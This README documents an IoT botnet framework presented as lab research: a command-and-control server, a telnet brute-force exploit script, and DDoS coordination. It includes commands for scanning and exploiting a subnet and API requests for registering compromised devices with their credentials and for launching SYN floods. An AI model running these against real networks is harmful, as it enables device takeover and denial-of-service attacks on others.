# IoT Attack & Threat Framework

## Overview

This framework provides tools for IoT security research in controlled lab environments. It consists of a Command and Control (C2) server and an exploit script that can discover vulnerable IoT devices, exploit them through telnet brute-forcing, and coordinate distributed attacks.

## 🚨 Educational Purpose Only

This software is designed for educational and research purposes in controlled lab environments only. It should never be used against systems without explicit authorization.

## Components

1. **C2 Server** (`c2_server/`) - Central command server with web interface
2. **Exploit Script** (`exploit.py`) - Network scanning and device exploitation
3. **Bot Client** (`bot_client.py`) - Simulated IoT bot for testing
4. **Registration Verification System** - Device synchronization monitoring
5. **Testing Suite** - Comprehensive validation and analysis tools

## Quick Start

### 1. Install Dependencies

```bash
# Create virtual environment
python -m venv .venv

# Windows
.venv\Scripts\Activate.ps1

# Linux/Mac
source .venv/bin/activate

# Install requirements
pip install -r requirements.txt
```

### 2. Start the C2 Server

```bash
cd c2_server
python run_c2.py
```

Web interface: `http://127.0.0.1:5000`

### 3. Run Network Exploitation

```bash
python exploit.py [C2_SERVER_IP] [TARGET_SUBNET]
```

Example:
```bash
python exploit.py 127.0.0.1 192.168.1.0/24
```

## Web Interface Features

- **Real-time Dashboard**: Monitor compromised devices and active attacks
- **Device Management**: View online/offline status and device details
- **Attack Coordination**: Start/stop DDoS attacks remotely
- **Network Scanning**: View discovered vulnerable devices
- **Statistics**: Track compromise rates and attack metrics

## C2 Server API

### Device Registration
```http
POST /bot-checkin
Content-Type: application/json

{
    "ip": "192.168.1.100",
    "username": "admin",
    "password": "password",
    "device_type": "camera"
}
```

### Attack Management
```http
POST /start-telnet-ddos
Content-Type: application/json

{
    "target": "192.168.1.1",
    "attack_type": "syn"
}
```

```http
POST /stop-telnet-ddos
```

## File Structure

```
AttackThreat/
├── exploit.py              # Main exploitation script
├── bot_client.py           # IoT bot simulator
├── credentials.py          # Default credential lists
├── requirements.txt        # Python dependencies
└── c2_server/             # Command & Control server
    ├── c2_server.py       # Flask web server
    ├── web_ui.py          # Web interface template
    ├── db_manager.py      # Database operations
    ├── tn_manager.py      # Telnet connection manager
    ├── run_c2.py          # Server startup script
    └── requirements.txt   # C2-specific dependencies
```

## Development

### Testing the System

#### Basic System Tests
```bash
# Linux
./test_system.sh

# Check syntax
python -c "import exploit; print('✅ exploit.py OK')"
python -c "import c2_server.web_ui; print('✅ web_ui.py OK')"
```

#### Registration Verification Tests
```bash
# Test registration verification system
python test_registration_verification.py

# Test registration fix functionality  
python test_registration_fix.py

# Comprehensive DDoS attack analysis
python test_ddos_comprehensive.py
```

#### Test Results
- See `TESTING_RESULTS.md` for detailed test validation reports
- Tests verify device synchronization between local tracking and C2 server
- Validates DDoS attack effectiveness measurement
- Confirms registration issue detection and resolution

### Database Schema

The C2 server uses SQLite with tables for:
- `devices` - Compromised device inventory
- `scan_results` - Network discovery data
- `sessions` - Active attack sessions

## Security Notes

- All communications use HTTP (for lab use only)
- Passwords are stored in plaintext (educational purposes)
- No authentication required for C2 interface (lab environment)
- Designed for isolated test networks only

## Legal Disclaimer

This tool is for authorized security testing and educational purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. Unauthorized use against systems you do not own or have explicit permission to test is prohibited and may be illegal.
- Required Python packages (automatically installed by start scripts):
  - Flask
  - Requests
  - Telnetlib3
  - Python-dotenv
  - Paho-MQTT

## Documentation

For detailed documentation on the C2 server architecture and API endpoints, see the [C2 Server README](c2_server/README.md).

## System Cleanup

### Windows
```
cleanup.bat
```

### Linux/Ubuntu
```
./cleanup.sh
```

This will clean up the database, log files, and cache files for a fresh start.

## License

This project is for educational purposes only. Usage for any malicious activity is strictly prohibited.
